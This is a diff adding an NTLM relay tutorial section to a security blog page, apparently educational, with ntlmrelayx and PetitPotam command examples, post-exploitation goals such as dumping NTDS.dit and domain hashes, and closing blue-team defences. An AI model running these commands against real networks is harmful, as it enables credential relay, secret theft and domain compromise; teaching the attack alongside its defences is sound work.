@@ -42,6 +42,91 @@
 <figure><img src="/images/ntlm.png"/>
 </figure>
 
+<h2 id="ntlm-relay">NTLM Relay</h2>
+<p>🧩 Overview</p>
+<h3 id="ntlm-relay-is-an-attack-where-you-do-not-crack-or-know-the-victim-s-password-dot">NTLM relay is an attack where you do not crack or know the victim’s password.</h3>
+<p>Instead, you trick a Windows machine into authenticating to you, then you forward that authentication to another server and become that user there.</p>
+<p>This works because NTLM is a challenge–response protocol that (if protections are weak) allows credentials to be forwarded intact.</p>
+<h3 id="components">🖥 Components</h3>
+<ul>
+<li>Victim workstation: Win10-Client. The machine whose authentication you want to steal/relay.</li>
+<li>Target server: FileServer01. The server you want to authenticate to using the victim’s identity.</li>
+<li>Attacker machine: Kali or similar. Running tools like Responder or ntlmrelayx.py.</li>
+</ul>
+<h3 id="step-1-set-the-trap--listen-for-inbound-auth">🔧 Step 1 — Set the Trap (listen for inbound auth)</h3>
+<ul>
+<li>The attacker prepares to capture NTLM authentication attempts.</li>
+<li>Responder listens for LLMNR/NBT-NS traffic and spoofs hostname responses.</li>
+<li>ntlmrelayx can relay captured credentials to a downstream target.</li>
+</ul>
+<h4 id="example">Example:</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ntlmrelayx.py -t smb://FileServer01 --smb2support
+</span></span></code></pre></div><p>This configures ntlmrelayx to:</p>
+<ul>
+<li>accept NTLM authentication attempts,</li>
+<li>negotiate SMB2 (faster + more reliable),</li>
+<li>immediately forward whatever credentials are captured to the SMB service on FileServer01.</li>
+</ul>
+<h3 id="step-2-trigger-authentication">🎣 Step 2 — Trigger Authentication</h3>
+<p>Windows machines routinely send credentials over the network when they think they are talking to a file server or internal service.
+Attackers exploit this behavior using coercion tools.</p>
+<h4 id="common-coercion-examples">Common coercion examples:</h4>
+<ul>
+<li>LLMNR/NBT-NS spoofing (via Responder)
+→ convince the victim that your machine is the host it is trying to reach.</li>
+<li>PetitPotam (EFSRPC abuse)</li>
+<li>PrinterBug (MS-RPRN)</li>
+<li>DFSCoerce (Distributed File System abuse)</li>
+</ul>
+<p>Example PetitPotam coercion:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 PetitPotam.py -d domain.local -u user -p pass attacker@victim
+</span></span></code></pre></div><ul>
+<li>This instructs victim to initiate an NTLM authentication handshake toward attacker.</li>
+</ul>
+<h3 id="step-3-relay-the-authentication">🔁 Step 3 — Relay the Authentication</h3>
+<p>When the victim authenticates to the attacker&rsquo;s server:</p>
+<ul>
+<li>ntlmrelayx captures the NTLM challenge/response values.</li>
+<li>It immediately forwards them to FileServer01.</li>
+<li>This works only if the target server accepts unsigned SMB traffic or lacks EPA/Channel Binding: SMB signing disabled? → relay successful. SMB signing required? → relay fails.</li>
+<li>If FileServer01 trusts the signing settings, the attacker now holds a full authenticated SMB session as the victim user.</li>
+</ul>
+<h3 id="step-4-use-the-relayed-session--command-execution-privilege-abuse">🛠 Step 4 — Use the Relayed Session (Command Execution / Privilege Abuse)</h3>
+<p>Once authenticated, ntlmrelayx automatically tries post-exploitation actions depending on the victim’s privileges.
+You may be able to:</p>
+<ul>
+<li>Enumerate shares</li>
+<li>Dump LSA secrets</li>
+<li>Extract SAM database</li>
+<li>Execute commands (via smbexec.py or psexec.py-style techniques)</li>
+<li>Add a new domain or local admin</li>
+</ul>
+<p>If the target is a domain controller:</p>
+<ul>
+<li>Dump NTDS.dit</li>
+<li>Extract all domain password hashes</li>
+<li>Achieve full domain compromise</li>
+</ul>
+<p>All without knowing the victim’s password or cracking anything.</p>
+<h3 id="why-this-works">🧨 Why This Works</h3>
+<p>NTLM’s design allows the challenge–response hash to be forwarded unchanged unless defenses are enabled:</p>
+<ul>
+<li>SMB Signing prevents MITM → cannot tamper or relay.</li>
+<li>EPA (Extended Protection for Authentication) binds the authentication to the specific service/SPN.</li>
+<li>Channel Binding Tokens prevent HTTP → SMB relays.</li>
+<li>Most real-world relays succeed because:
+legacy systems have SMB signing disabled for performance,
+misconfigured servers don’t require EPA,
+printers and non-Windows appliances still rely on NTLM.</li>
+</ul>
+<h3 id="defenses--blue-team-notes">🛡 Defenses (Blue Team Notes)</h3>
+<ul>
+<li>Require SMB signing everywhere.</li>
+<li>Enforce EPA on all IIS and LDAP endpoints.</li>
+<li>Disable NTLMv1 entirely.</li>
+<li>Restrict NTLM usage per-server with NTLM Audit policies.</li>
+<li>Prefer Kerberos over NTLM where possible.</li>
+</ul>
 
       </div>
       
@@ -401,6 +486,12 @@
 
    
       
+   
+
+   
+
+   
+
    
 
    
